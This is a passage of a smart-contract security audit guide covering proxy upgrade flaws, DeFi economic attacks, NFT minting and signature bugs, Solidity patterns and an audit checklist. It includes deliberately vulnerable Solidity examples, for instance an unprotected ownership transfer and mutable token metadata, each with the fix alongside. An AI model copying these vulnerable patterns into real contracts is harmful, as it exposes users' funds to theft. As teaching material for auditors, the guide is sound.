}

// FIX: Add initializer with __gap pattern
contract ImplementationV2 is ImplementationV1 {
    uint256[49] private __gap;  // Reserve slots for future vars
    uint256 public newVar;      // slot 50
}
```

### Upgrade Mechanism Attacks

```
1. Unprotected upgrade function
   - No timelock
   - No multisig
   - Single admin can upgrade to malicious implementation

2. Storage layout incompatibility
   - New implementation doesn't match old storage layout
   - Variables in wrong slots → fund loss

3. Initialization replay
   - V2 can be initialized with V1's init parameters
   - Attacker reinitializes V2 to their control

4. Logic bypass via delegatecall
   - Fallback function in proxy delegates to implementation
   - Implementation has logic that should be in proxy
   - Storage manipulation possible
```

---

## DeFi Economic Attack Vectors

### 1. Sandwich Attack Defense Analysis

```solidity
// Analyze DEX for sandwich vulnerability
contract SandwichAnalysis {
    function checkVulnerability() public view returns (bool vulnerable) {
        // Check 1: Is there slippage protection?
        // If no slippage check → vulnerable
        
        // Check 2: Is there a minimum output?
        // If no minimum → vulnerable
        
        // Check 3: Is it using Uniswap V2?
        // V2 more vulnerable than V3 (concentrated liquidity)
        
        // Check 4: Is it using DEX aggregator?
        // 1inch, Paraswap have some protection
        
        return true;  // vulnerable
    }
}
```

### 2. Impermanent Loss Exploitation

```solidity
// Protocol that compensates IL incorrectly
contract BadILCompensation {
    function removeLiquidity(uint shares) public returns (uint, uint) {
        // VULN: Calculates IL compensation incorrectly
        // Attacker adds liquidity at balanced price
        // Price moves dramatically
        // Removes liquidity during high IL
        // Compensation > actual loss → profit
        
        uint amount0 = (shares * balance0) / totalShares;
        uint amount1 = (shares * balance1) / totalShares;
        
        // VULN: Doesn't account for current price vs entry price
        // Should use time-weighted average for fair compensation
        
        return (amount0, amount1);
    }
}
```

### 3. Governance Attack

```solidity
// Analyze governance contract
contract GovernanceAudit {
    function checkVulnerabilities() public {
        // Check 1: Can flash loans be used to vote?
        // Check 2: Is there a voting delay?
        // Check 3: Is there a quorum?
        // Check 4: Can votes be delegated?
        // Check 5: Is proposal execution immediate?
        
        // Vulnerable pattern: no timelock, low quorum, flash loan possible
    }
}
```

---

## NFT-Specific Deep Dive

### ERC721 Vulnerabilities

**1. Mint Race Condition:**
```solidity
contract MintRace {
    uint256 public totalSupply = 100;
    uint256 public minted;
    uint256 public mintPrice = 0.1 ether;
    
    function mint() public payable {
        require(msg.value >= mintPrice);
        require(minted < totalSupply);
        minted++;
        _safeMint(msg.sender, minted);
    }
}

// Attack: Front-run with high gas to grab limited supply
// FIX: Use Merkle tree allowlist or commit-reveal
```

**2. Signature Malleability in Mint:**
```solidity
contract SigMalleable {
    function mint(bytes calldata signature) external {
        bytes32 hash = keccak256(abi.encodePacked(msg.sender, nonce));
        address signer = recover(hash, signature);
        require(signer == owner);
        _safeMint(msg.sender, tokenId);
    }
}

// Attack: ECDSA signature malleability
// s value can be modified: s' = -s mod n
// Both s and s' are valid signatures → can reuse signature

// FIX: Check s in lower half of curve order
require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F66681B);
```

**3. Metadata Frozen After Mint:**
```solidity
// VULNERABLE: metadata can be changed after sale
contract VulnNFT is ERC721 {
    function tokenURI(uint256 tokenId) public view returns (string memory) {
        return _tokenURIs[tokenId];  // mutable
    }
}

// Attack: Mint NFT, sell for 10 ETH, change metadata to offensive image
// Fix: Store IPFS hash, or set immutable metadata after reveal
```

---

## Solidity Best Practices Audit

### Access Control Patterns

```solidity
// GOOD: OpenZeppelin Ownable
contract GoodAccess is Ownable {
    function sensitiveFunction() external onlyOwner {
        // Only owner can call
    }
}

// BAD: Custom access control with bug
contract BadAccess {
    address public owner;
    
    function transferOwnership(address newOwner) external {
        // VULN: No onlyOwner modifier!
        owner = newOwner;  // Anyone can take over
    }
}
```

### Event Emission

```solidity
// Events should be emitted for ALL state changes
// This enables off-chain monitoring and indexing

// GOOD
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);

// BAD: Missing events
contract BadToken {
    function transfer(address to, uint amount) external {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        // VULN: No Transfer event emitted
        // Indexers (TheGraph) won't see this transfer
        // Users can't track their balance changes
    }
}
```

### Pull-over-Push Pattern

```solidity
// PUSH (vulnerable to reentrancy):
contract Push {
    mapping(address => uint) public balances;
    
    function distribute() external {
        for (uint i = 0; i < payees.length; i++) {
            (bool success, ) = payees[i].call{value: balances[payees[i]]}("");
            require(success);  // If one fails, all fail
        }
    }
}

// PULL (safe):
contract Pull {
    mapping(address => uint) public balances;
    
    function withdraw() external {
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

---

## Complete Web3 Audit Checklist

### General Checklist
- [ ] Reentrancy guard on all external-call functions
- [ ] CEI pattern (state before external calls)
- [ ] tx.origin not used for authorization
- [ ] All external call return values checked
- [ ] Integer overflow/underflow handled (Solidity 0.8+ or SafeMath)
- [ ] Access control correct (onlyOwner, onlyAdmin modifiers)
- [ ] No delegatecall with user-controlled data
- [ ] No extcodesize for contract detection (bypassable)
- [ ] Proper event emission for all state changes
- [ ] No hardcoded addresses (use immutable/constant)

### DeFi Checklist
- [ ] Flash loan attack vectors considered
- [ ] Price oracle manipulation resistant (TWAP/Chainlink)
- [ ] Slippage protection on all swaps
- [ ] No single-block price dependence
- [ ] Liquidity calculations correct (fee-on-transfer tokens)
- [ ] Sandwich attack mitigation
- [ ] MEV considerations
- [ ] Liquidation logic uses TWAP, not spot price
- [ ] Interest rate model stable
- [ ] Collateral ratios enforced correctly
- [ ] No dead addresses in fee calculations

### Token Standards Checklist
- [ ] ERC20: Return values checked, proper events, no infinite approve
- [ ] ERC721: safeTransferFrom checks, ERC721Receiver, no reentrancy
- [ ] ERC1155: Batch transfer safety, operator limits, URI consistency
- [ ] ERC777: No reentrancy in hooks, proper operator handling

### Upgrade Mechanism Checklist
- [ ] Proxy pattern correctly implemented
- [ ] Initialization protected (no replay)
- [ ] Storage layout compatibility checked
- [ ] Admin-only upgrade function
- [ ] Timelock on upgrades (recommended)

---

## Final Rule

> **Smart contract bugs are expensive. One vulnerability can drain millions. Audit slowly, think economically, test every edge case. The blockchain doesn't have an undo button.**
```
